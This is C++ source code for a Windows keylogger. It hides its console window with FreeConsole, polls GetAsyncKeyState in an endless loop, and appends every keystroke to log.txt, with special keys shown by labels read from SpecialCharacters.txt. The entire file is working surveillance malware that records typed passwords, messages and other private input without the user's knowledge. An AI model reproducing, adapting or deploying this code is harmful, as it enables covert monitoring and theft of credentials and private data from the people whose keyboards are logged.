#include <iostream>
#include <string>
#include <sstream>
#include <map>
#include <fstream>
#include <Windows.h>
using namespace std;
void InitializeWindowKeyMap(map<int,string> &WindowKeyMap)
{
	map<int,string> WindowKeys=WindowKeyMap;
	int WindowKeyInt;
	string WindowKeyStringToInt;
	string WindowKeyDisplay;
	int pos;
	ifstream file("SpecialCharacters.txt"); 
	string currentLine;
	while(std::getline(file,currentLine))
	{

		pos=currentLine.find("[");
		
		WindowKeyStringToInt=(pos==2) ? string (1,currentLine[0]):currentLine.substr(0,2);
		istringstream convert(WindowKeyStringToInt);
		convert>>WindowKeyInt;
		
		WindowKeyDisplay=currentLine.substr(pos);

		WindowKeyMap[WindowKeyInt]=WindowKeyDisplay;
	}
	
}

int Save(int _key, char *file,map<int,string> WindowKeyMap)
{
	Sleep(10);
	char savedCharacter;
	std::ofstream OUTPUT_FILE(file,std::ios_base::app);
	if(WindowKeyMap.count(_key)>0)
	{
		OUTPUT_FILE<<WindowKeyMap[_key];
	}
	else
	{
		savedCharacter=_key;
		OUTPUT_FILE<<savedCharacter;
	}
	return 0;
	
}

int main()
{
	FreeConsole();
	char i;
	map<int,string> WindowKeyMap;
	InitializeWindowKeyMap(WindowKeyMap);
	while(true)
	{
		Sleep(10);
		for(int i=8;i<=255;i++)
		{
			if(GetAsyncKeyState(i)== -32767)
			{
				Save(i,"log.txt",WindowKeyMap);
			}
		}
	}
}

